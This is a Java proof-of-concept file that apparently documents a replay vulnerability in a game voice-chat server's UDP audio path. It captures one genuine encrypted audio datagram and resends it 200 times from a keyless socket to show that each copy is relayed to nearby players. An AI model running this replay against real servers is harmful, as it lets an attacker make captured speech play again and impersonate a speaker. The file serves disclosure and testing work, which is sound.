package com.enn3developer.gtnhvoice.security;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

import com.enn3developer.gtnhvoice.core.proto.packets.Packet;
import com.enn3developer.gtnhvoice.core.proto.packets.udp.bothbound.BaseAudioPacket;
import com.enn3developer.gtnhvoice.core.proto.packets.udp.clientbound.SourceAudioPacket;

/**
 * Finding: the serverbound UDP audio path has NO replay/dedup guard. The only anti-replay state on a
 * session, {@code VoiceServerSession.lastAcceptedTimestamp}, gates ONLY address relearning inside
 * {@code touch()} (a packet with {@code timestamp <= watermark} just skips the relearn and returns) -
 * the packet is still handed to {@code handleAudio -> routeAudio} and fanned out to every in-range
 * player. AES-GCM authenticates a datagram but does not stop a <em>replay</em> of a genuine one, and
 * nothing else de-duplicates it, so a byte-for-byte copy of one captured {@code PlayerAudioPacket}
 * datagram is re-routed in full every time it is resent.
 *
 * <p>This is the audio-content sibling of the address-relearn anti-replay the server DOES implement:
 * an on-path attacker (no session, no key) captures one genuine speaker datagram off the wire and
 * replays the identical bytes; the server decrypts it (with the still-online speaker's key, by
 * sessionId lookup) and delivers it to nearby players as if the speaker spoke again. The attacker can
 * make a victim's captured speech play to everyone in range at a moment of the attacker's choosing.
 *
 * <p>Layout (one process, three actors):
 * <ul>
 *   <li><b>victim</b> - logs in, pings so the server learns its UDP address, then counts inbound
 *       {@code SourceAudioPacket}s and records their sequence numbers.</li>
 *   <li><b>alice</b> - a genuine speaker: logs in, pings, and produces exactly ONE
 *       {@code PlayerAudioPacket} whose on-wire datagram bytes we capture (this is what an on-path
 *       attacker would sniff). She then stays connected but silent, so her whole rate-limit budget is
 *       free and the replay is not confounded by her own traffic.</li>
 *   <li><b>replayer</b> - a bare {@link DatagramSocket} with NO voice session and NO key. It resends
 *       alice's one captured datagram K times, paced UNDER the server's ~50 frames/s audio rate cap so
 *       every copy is admitted, proving each replay is independently routed (no dedup) rather than the
 *       flood being clipped by the limiter.</li>
 * </ul>
 *
 * <p>Smoking gun: the victim receives ~K relayed frames that ALL carry the SAME sequence number - the
 * one captured frame delivered K times. A server with any replay window would deliver it once.
 */
public final class AudioReplayInjection {

    private static final int PAYLOAD_SIZE = 960;

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 25565;
        int replayCount = args.length > 2 ? Integer.parseInt(args[2]) : 200;
        // Paced below the server's ~50/s per-speaker audio cap so admission, not rate-limiting, is what
        // the delivered count measures. 40/s * 5s = 200 copies.
        int replayRate = args.length > 3 ? Integer.parseInt(args[3]) : 40;

        CountDownLatch victimReady = new CountDownLatch(1);
        AtomicBoolean stop = new AtomicBoolean(false);
        AtomicLong victimFrames = new AtomicLong();
        AtomicLong distinctSeqSeen = new AtomicLong(-1);
        AtomicBoolean allSameSeq = new AtomicBoolean(true);

        Thread victimThread = new Thread(() -> {
            try (VoiceSession victim = Client.connect(host, port)
                .username("victimbot")
                .establish()) {

                victim.enlargeReceiveBuffer(4 * 1024 * 1024);
                victim.ping()
                    .ping()
                    .ping();
                System.out.println("[replay] victim up: sessionId=" + victim.getSessionId());
                victimReady.countDown();

                while (!stop.get()) {
                    byte[] frame = victim.receiveUdp(200);
                    if (frame == null) continue;
                    Packet<?> packet = victim.decode(frame);
                    if (!(packet instanceof SourceAudioPacket)) continue;
                    long seq = ((BaseAudioPacket<?>) packet).getSequenceNumber();
                    victimFrames.incrementAndGet();
                    long prev = distinctSeqSeen.getAndSet(seq);
                    if (prev != -1 && prev != seq) allSameSeq.set(false);
                }
            } catch (Exception e) {
                System.out.println("[replay] victim error: " + e);
                victimReady.countDown();
            }
        }, "victim");
        victimThread.start();
        victimReady.await();

        try (VoiceSession alice = Client.connect(host, port)
            .username("alice")
            .establish()) {

            alice.ping()
                .ping();
            System.out.println("[replay] alice (genuine speaker) up: sessionId=" + alice.getSessionId());

            // One genuine speaker frame. These bytes are exactly what would cross the wire; an on-path
            // attacker captures them. We do NOT rely on alice's key/session again after this.
            byte[] audio = new byte[PAYLOAD_SIZE];
            java.util.Arrays.fill(audio, (byte) 0x5a);
            long capturedSeq = 424242L;
            byte[] capturedDatagram = alice.encodePlayerAudio(capturedSeq, audio, UUID.randomUUID(), (short) 0, false);
            System.out.println("[replay] captured ONE genuine PlayerAudioPacket datagram: " + capturedDatagram.length
                + " bytes, sequenceNumber=" + capturedSeq);

            // Keyless on-path replayer: a bare UDP socket, no voice session at all.
            InetSocketAddress server = alice.getUdpServer();
            long delivered;
            try (DatagramSocket rawReplayer = new DatagramSocket()) {
                System.out.println("[replay] replaying the SAME captured datagram " + replayCount + "x at ~"
                    + replayRate + "/s from a keyless raw socket -> " + server + " ...");
                long start = System.nanoTime();
                long nanosPer = 1_000_000_000L / replayRate;
                for (int i = 0; i < replayCount; i++) {
                    rawReplayer.send(new DatagramPacket(
                        capturedDatagram, capturedDatagram.length, server.getAddress(), server.getPort()));
                    long due = start + (long) (i + 1) * nanosPer;
                    while (System.nanoTime() < due) { /* pace */ }
                }
                System.out.printf("[replay] sent %d identical copies in %.2fs%n",
                    replayCount, (System.nanoTime() - start) / 1e9);
            }

            Thread.sleep(1500);
        } finally {
            stop.set(true);
            victimThread.join(4000);
        }

        long frames = victimFrames.get();
        System.out.println("=================== AUDIO REPLAY RESULT ===================");
        System.out.printf("replayed 1 captured datagram %dx; victim received %d relayed SourceAudioPackets%n",
            replayCount, frames);
        System.out.println("all delivered frames carried the SAME sequenceNumber: " + allSameSeq.get()
            + " (last seq seen=" + distinctSeqSeen.get() + ")");
        System.out.println(frames > 1
            ? ">>> NO replay/dedup: one captured frame was re-routed " + frames + " times (keyless on-path replay)."
            : ">>> frame delivered <=1x: a replay guard appears to be present.");
        System.out.println("==========================================================");
    }

    private AudioReplayInjection() {}
}
